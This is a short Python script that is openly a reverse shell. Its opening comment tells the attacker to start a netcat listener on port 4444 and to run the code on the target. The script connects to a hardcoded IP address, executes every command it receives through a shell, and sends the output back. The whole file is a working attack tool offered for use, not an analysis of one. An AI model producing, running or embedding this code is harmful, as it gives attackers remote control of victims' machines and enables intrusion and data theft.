#!/usr/bin/env python3
'''
Do this on hacker machine:

nc -vv -l -p 4444
netcat verbose listen port 4444


Run this code on the target:

'''
import socket
import subprocess

def execute_command(command):
    output = subprocess.check_output(command, shell=True)
    return output

def connect_to(ip, port):
    # create a socket object
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # connect 
    connection.connect((ip, port))
    connection.send("\n[INFO] Connection Established\n[COMMAND] ".encode("utf-8"))
    print("[INFO] Connection Established")
    return connection

def send_str(connection, stringMessage):
    connection.send(("\n" + stringMessage + "\n[COMMAND] : ").encode("utf-8"))
    return

def recv_str(connection, bufferSize):
    recv_data = connection.recv(bufferSize).decode("utf-8")
    return recv_data

terminators = ["close"]

# MAIN PROGRAM
pipe = connect_to("192.168.1.197", 4444)
response_str = recv_str(pipe, 1024)
while (True):
    if response_str.strip() == "close":
        break
    print("[REPLY] : " + response_str)
    try:
        output = execute_command(response_str)
        send_str(pipe, output.decode("utf-8"))
    except:
        send_str(pipe, "This command is not recognized")
    response_str = recv_str(pipe, 1024)

pipe.close()




